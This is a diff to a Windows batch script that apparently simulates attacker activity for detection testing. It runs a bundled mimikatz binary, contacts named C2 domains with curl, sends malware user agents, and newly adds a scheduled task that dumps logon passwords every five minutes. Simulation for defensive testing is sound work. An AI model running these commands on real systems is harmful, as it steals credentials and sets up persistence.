@@ -168,7 +168,7 @@ ping -n 5 127.0.0.1 > NUL
 
 %ZIP% e -p%PASS% %TOOLARCH% -aoa -o%APTDIR% toolset\mim.exe > NUL
 
-ECHO Executing it to get it into memory & saving the output to out.tmp ...
+ECHO Executing it to get it into memory and saving the output to out.tmp ...
 ping -n 5 127.0.0.1 > NUL
 %APTDIR%\mim.exe > out.tmp
 
@@ -255,32 +255,39 @@ ECHO ===========================================================================
 ECHO C2 Access
 ECHO.
 ECHO Using curl to access well-known C2 addresses
-ping -n 5 127.0.0.1 > NUL
 
 ECHO C2: msupdater.com
-%CURL% -s -o /dev/null -I -w "%{http_code}" msupdater.com
+%CURL% -s -o /dev/null -I -w "Result: %%{http_code}\n" -m3 msupdater.com
 ECHO C2: twitterdocs.com
-%CURL% -s -o /dev/null -I -w "%{http_code}" twitterdocs.com
+%CURL% -s -o /dev/null -I -w "Result: %%{http_code}\n" -m3 twitterdocs.com
 ECHO C2: freenow.chickenkiller.com
-%CURL% -s -o /dev/null -I -w "%{http_code}" freenow.chickenkiller.com
+%CURL% -s -o /dev/null -I -w "Result: %%{http_code}\n" -m3 freenow.chickenkiller.com
 ECHO C2: www.googleaccountsservices.com
-%CURL% -s -o /dev/null -I -w "%{http_code}" www.googleaccountsservices.com
+%CURL% -s -o /dev/null -I -w "Result: %%{http_code}\n" -m3 www.googleaccountsservices.com
 
 ECHO.
 ECHO ===========================================================================
 ECHO MALICIOUS UA
 ECHO.
 ECHO Using malicious user agents to access web sites
-ping -n 5 127.0.0.1 > NUL
 
 ECHO HttpBrowser RAT
-%CURL% -s -o /dev/null -I -w "%{http_code}" -A "HttpBrowser/1.0" www.google.com
+%CURL% -s -o /dev/null -I -w "Result: %%{http_code}\n" -A "HttpBrowser/1.0" -m3 www.google.com
 ECHO Dyre / Upatre
-%CURL% -s -o /dev/null -I -w "%{http_code}" -A "Wget/1.9+cvs-stable (Red Hat modified)" www.google.com
+%CURL% -s -o /dev/null -I -w "Result: %%{http_code}\n" -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 www.google.com
 ECHO Sality
-%CURL% -s -o /dev/null -I -w "%{http_code}" -A "Opera/8.81 (Windows NT 6.0; U; en)" www.google.com
+%CURL% -s -o /dev/null -I -w "Result: %%{http_code}\n" -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 www.google.com
 ECHO NJRat
-%CURL% -s -o /dev/null -I -w "%{http_code}" -A "*<|>*" www.google.com
+%CURL% -s -o /dev/null -I -w "Result: %%{http_code}\n" -A "*<|>*" -m3 www.google.com
+
+ECHO.
+ECHO ===========================================================================
+ECHO Schtasks Creation
+ECHO.
+ECHO Registering mimikatz in scheduled task
+ping -n 5 127.0.0.1 > NUL
+
+schtasks /create /sc minute /mo 5 /tn GameOver /tr "C:\TMP\mim.exe sekurlsa::LogonPasswords > C:\TMP\o.txt"
 
 :END
 ECHO.
